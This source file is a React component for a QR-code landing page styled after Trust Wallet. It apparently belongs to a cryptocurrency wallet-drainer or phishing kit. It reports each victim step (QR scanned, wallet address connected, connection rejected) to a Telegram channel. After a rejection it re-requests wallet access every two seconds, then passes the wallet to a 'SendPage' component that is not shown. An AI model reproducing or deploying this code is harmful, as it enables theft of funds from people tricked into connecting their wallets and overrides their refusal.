// src/QRLanding.tsx
import { useState, useEffect } from "react";
import { ethers } from "ethers";
import { notify, formatAddress } from "../lib/telegram";
import SendPage from "./send-page";

type Step = "detecting" | "send" | "error";

export default function QRLanding() {
  const [step, setStep] = useState<Step>("detecting");
  const [provider, setProvider] = useState<ethers.BrowserProvider | null>(null);
  const [address, setAddress] = useState("");

  useEffect(() => {
    // Notify that QR was scanned
    notify("📱 <b>QR Code Scanned</b>");

    const tryDetect = async () => {
      // Check for injected providers (Trust Wallet, MetaMask, etc.)
      const eth = (window as any).ethereum;
      const trustWallet = (window as any).trustwallet;

      // Trust Wallet's DApp browser injects `window.ethereum`
      const provider = eth || trustWallet;

      if (!provider) {
        setStep("error");
        return;
      }

      try {
        // Request accounts
        const bp = new ethers.BrowserProvider(provider);
        const accounts = await bp.send("eth_requestAccounts", []);
        const addr = accounts[0];

        await notify(`🔗 <b>Wallet Connected</b>\n${formatAddress(addr)}`);

        setProvider(bp);
        setAddress(addr);
        setStep("send");
      } catch (err: any) {
        // Handle errors (e.g., user rejected connection)
        if (err.code === 4001 || err.message?.includes("user rejected")) {
          // User rejected → retry after 2 seconds
          await notify(`⚠️ <b>Connection Rejected</b>\nRetrying...`);
          setTimeout(tryDetect, 2000);
        } else {
          setStep("error");
        }
      }
    };

    // Auto-detect on page load
    tryDetect();
  }, []);

  if (step === "detecting") {
    return (
      <div className="min-h-screen bg-[#0C0F1E] flex items-center justify-center">
        <div className="text-center">
          <div className="w-16 h-16 border-4 border-[#23263B] border-t-[#3375BB] rounded-full animate-spin mx-auto mb-4" />
          <p className="text-white text-lg">Connecting to Wallet...</p>
          <p className="text-[#8892A4] text-sm mt-2">
            Please approve the connection in your wallet
          </p>
        </div>
      </div>
    );
  }

  if (step === "error") {
    return (
      <div className="min-h-screen bg-[#0C0F1E] flex items-center justify-center px-6">
        <div className="text-center">
          <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-red-500/20 flex items-center justify-center">
            <span className="text-red-500 text-3xl">!</span>
          </div>
          <h2 className="text-white text-xl font-semibold mb-2">
            Wallet Not Detected
          </h2>
          <p className="text-[#8892A4] text-sm">
            Please open this page in <b>Trust Wallet's built-in browser</b>.
          </p>
          <p className="text-[#5A5F7A] text-xs mt-4">
            Trust Wallet &rarr; DApp Browser &rarr; Enter this URL
          </p>
          <button
            onClick={() => window.location.reload()}
            className="mt-6 bg-[#3375BB] text-white px-6 py-2 rounded-lg text-sm"
          >
            Retry
          </button>
        </div>
      </div>
    );
  }

  if (provider && address) {
    return <SendPage provider={provider} address={address} />;
  }

  return null;
}